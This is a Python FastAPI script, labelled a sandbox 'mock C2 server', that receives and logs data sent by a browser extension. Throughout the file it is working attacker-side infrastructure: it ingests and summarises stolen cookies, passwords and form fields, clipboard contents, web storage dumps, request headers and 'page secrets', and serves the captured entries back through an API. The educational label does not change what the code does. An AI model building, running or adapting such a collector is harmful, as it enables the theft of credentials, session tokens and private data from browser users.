#!/usr/bin/env python3
"""
MOCK C2 server — sandbox/educational use only.
Listens on http://localhost:8787, logs all ingest POSTs to ./log.ndjson
and prints a colourised console summary.

Install: pip install fastapi uvicorn
Run:     uvicorn server:app --host 127.0.0.1 --port 8787 --reload
"""

import json
import os
import datetime
from pathlib import Path
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse

LOG_FILE = Path(__file__).parent / "log.ndjson"

app = FastAPI(title="Mock C2", docs_url="/docs")

# Allow requests from chrome-extension:// origins
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["POST", "OPTIONS"],
    allow_headers=["*"],
)

# ── Console colours ───────────────────────────────────────────────────────
RESET = "\033[0m"
RED   = "\033[91m"
YELLOW= "\033[93m"
CYAN  = "\033[96m"
GREEN = "\033[92m"
GREY  = "\033[90m"
BOLD  = "\033[1m"

KIND_COLOR = {
    "cookies":               RED,
    "extensions":            YELLOW,
    "network_headers":       YELLOW,
    "network_headers_final": YELLOW,
    "sensitive_url":         RED,
    "visited_urls":          GREY,
    "storage_dump":          CYAN,
    "form_capture":          RED + BOLD,
    "form_capture_passive":  RED,
    "password_fields":       RED + BOLD,
    "clipboard":             YELLOW,
    "page_secrets":          RED + BOLD,
}

def summarise(kind: str, payload: dict | list) -> str:
    lines = []
    if kind == "cookies" and isinstance(payload, dict):
        lines.append(f"  total in profile : {payload.get('total', '?')}")
        lines.append(f"  interesting hits : {payload.get('hits', '?')}")
        for c in payload.get("sample", [])[:5]:
            lines.append(
                f"    [{c['domain']}] {c['name']} = {c['value_preview']}"
                f"  (httpOnly={c['httpOnly']})"
            )
    elif kind == "extensions" and isinstance(payload, list):
        lines.append(f"  installed count  : {len(payload)}")
        for e in payload[:8]:
            lines.append(f"    {e['name']} v{e['version']} (enabled={e['enabled']})")
    elif kind in ("form_capture", "form_capture_passive") and isinstance(payload, dict):
        lines.append(f"  url   : {payload.get('url', '?')}")
        for k, v in payload.get("fields", {}).items():
            lines.append(f"  field [{k}] = {str(v)[:60]}")
    elif kind == "storage_dump" and isinstance(payload, dict):
        ls = payload.get("localStorage", {})
        ss = payload.get("sessionStorage", {})
        lines.append(f"  url            : {payload.get('url', '?')}")
        lines.append(f"  localStorage   : {len(ls)} keys")
        lines.append(f"  sessionStorage : {len(ss)} keys")
        for k in list(ls.keys())[:4]:
            lines.append(f"    ls[{k}] = {str(ls[k])[:60]}")
    elif kind == "page_secrets" and isinstance(payload, dict):
        lines.append(f"  url : {payload.get('url', '?')}")
        for s in payload.get("secrets", []):
            lines.append(f"  [{s['name']}] {s['preview']}")
    elif kind == "clipboard" and isinstance(payload, dict):
        lines.append(f"  url     : {payload.get('url', '?')}")
        lines.append(f"  content : {payload.get('preview', '')}")
    elif kind == "sensitive_url" and isinstance(payload, dict):
        lines.append(f"  url : {payload.get('url', '?')}")
    elif kind in ("network_headers", "network_headers_final") and isinstance(payload, list):
        for req in payload[:3]:
            lines.append(f"  {req.get('method')} {str(req.get('url', ''))[:80]}")
            for h in req.get("headers", []):
                lines.append(f"    {h['name']}: {h['value_preview']}")
    else:
        lines.append("  " + json.dumps(payload, ensure_ascii=False)[:400])
    return "\n".join(lines)


# ── In-memory store so /data endpoint can serve the popup ─────────────────
captured: list[dict] = []


@app.post("/ingest")
async def ingest(request: Request):
    try:
        obj = await request.json()
    except Exception:
        return JSONResponse({"ok": False, "error": "invalid JSON"}, status_code=400)

    # Persist to NDJSON log
    with LOG_FILE.open("a") as f:
        f.write(json.dumps(obj, ensure_ascii=False) + "\n")

    captured.append(obj)

    kind    = obj.get("kind", "unknown")
    payload = obj.get("payload", {})
    run_id  = str(obj.get("run", "?"))[:8]
    ts_raw  = obj.get("ts", 0)
    ts      = datetime.datetime.fromtimestamp(ts_raw / 1000).strftime("%H:%M:%S")
    color   = KIND_COLOR.get(kind, CYAN)

    print(f"\n{color}{BOLD}[{ts}] RECV kind={kind}  run={run_id}{RESET}")
    summary = summarise(kind, payload)
    if summary:
        print(summary)

    return {"ok": True}


@app.get("/data")
async def get_data(kind: str | None = None):
    """Return captured entries, optionally filtered by kind."""
    if kind:
        return [e for e in captured if e.get("kind") == kind]
    return captured


@app.delete("/data")
async def clear_data():
    """Clear in-memory capture list (does not touch log.ndjson)."""
    captured.clear()
    return {"ok": True, "cleared": True}


@app.get("/health")
async def health():
    return {"status": "ok", "captured": len(captured)}


# ── Startup banner ────────────────────────────────────────────────────────
@app.on_event("startup")
async def banner():
    print(f"\n{GREEN}{BOLD}MOCK C2 server — sandbox/educational only{RESET}")
    print(f"Listening on  http://127.0.0.1:8787")
    print(f"API docs      http://127.0.0.1:8787/docs")
    print(f"Captured data http://127.0.0.1:8787/data")
    print(f"Log file      {LOG_FILE}\n")
